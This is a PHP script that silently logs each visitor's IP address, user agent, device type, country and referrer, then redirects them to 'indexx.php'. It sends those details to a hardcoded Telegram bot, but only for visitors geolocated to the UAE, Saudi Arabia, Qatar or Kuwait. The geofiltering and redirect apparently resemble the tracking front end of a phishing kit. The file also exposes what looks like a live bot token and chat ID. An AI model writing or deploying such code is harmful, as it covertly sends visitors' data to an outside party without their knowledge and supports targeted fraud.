<?php
// Telegram Bot Configuration
$botToken = '6089955624:AAHBJdLEgxRLx_Ve7sX3AT860_QHEQm-bu8';
$chatId = '991558559';

// Get user information
$ipAddress = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$deviceType = getDeviceType($userAgent);

// Get country name (for message) and country code (for filtering)
$country = getCountryFromIP($ipAddress);
$countryCode = getCountryCodeFromIP($ipAddress);

// Prepare the message
$message = "📱 New Visitor Information:\n\n";
$message .= "🌐 IP Address: " . $ipAddress . "\n";
$message .= "📋 User Agent: " . $userAgent . "\n";
$message .= "📱 Device: " . $deviceType . "\n";
$message .= "📍 Country: " . $country . " (" . $countryCode . ")\n";
$message .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
$message .= "🔗 Referrer: " . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct') . "\n";

// Send to Telegram only if from AE, SA, QA, or KW
$allowedCodes = ['AE', 'SA', 'QA', 'KW'];
if (in_array($countryCode, $allowedCodes, true)) {
    sendToTelegram($botToken, $chatId, $message);
}

// Optional: Log to a file
// file_put_contents('visitors.log', $message . "\n---\n", FILE_APPEND);

// Redirect (avoid echo before header to prevent "headers already sent")
header('Location: indexx.php');
exit;

/**
 * Detect device type from user agent
 */
function getDeviceType($userAgent) {
    $userAgent = strtolower($userAgent);
    
    if (strpos($userAgent, 'mobile') !== false || 
        strpos($userAgent, 'android') !== false || 
        strpos($userAgent, 'iphone') !== false) {
        return 'Mobile';
    } elseif (strpos($userAgent, 'tablet') !== false || 
             strpos($userAgent, 'ipad') !== false) {
        return 'Tablet';
    } else {
        return 'Desktop';
    }
}

/**
 * Get human-readable country name from IP address using ipapi.co (free service)
 */
function getCountryFromIP($ip) {
    // For localhost or private IPs
    if ($ip === '127.0.0.1' || $ip === '::1' || substr($ip, 0, 7) === '192.168' || 
        substr($ip, 0, 3) === '10.' || substr($ip, 0, 7) === '172.16.') {
        return 'Local/Private Network';
    }
    
    try {
        $url = "https://ipapi.co/{$ip}/country_name/";
        $country = @file_get_contents($url);
        
        if ($country && $country !== 'Undefined') {
            return trim($country);
        }
        
        // Fallback method using ipinfo.io (returns code, not name)
        $data = @file_get_contents("https://ipinfo.io/{$ip}/json");
        if ($data) {
            $details = json_decode($data);
            // Return code if name unavailable (will still be shown alongside code)
            return isset($details->country) ? strtoupper(trim($details->country)) : 'Unknown';
        }
        
        return 'Unknown';
    } catch (Exception $e) {
        return 'Error fetching country';
    }
}

/**
 * Get ISO 2-letter country code from IP address
 */
function getCountryCodeFromIP($ip) {
    // For localhost or private IPs
    if ($ip === '127.0.0.1' || $ip === '::1' || substr($ip, 0, 7) === '192.168' || 
        substr($ip, 0, 3) === '10.' || substr($ip, 0, 7) === '172.16.') {
        return 'LOCAL';
    }

    try {
        // ipapi.co country code endpoint
        $url = "https://ipapi.co/{$ip}/country/";
        $code = @file_get_contents($url);
        if ($code && $code !== 'Undefined') {
            return strtoupper(trim($code));
        }

        // Fallback to ipinfo.io
        $data = @file_get_contents("https://ipinfo.io/{$ip}/json");
        if ($data) {
            $details = json_decode($data);
            if (isset($details->country) && $details->country) {
                return strtoupper(trim($details->country));
            }
        }

        return 'UNK';
    } catch (Exception $e) {
        return 'ERR';
    }
}

/**
 * Send message to Telegram
 */
function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result !== false;
}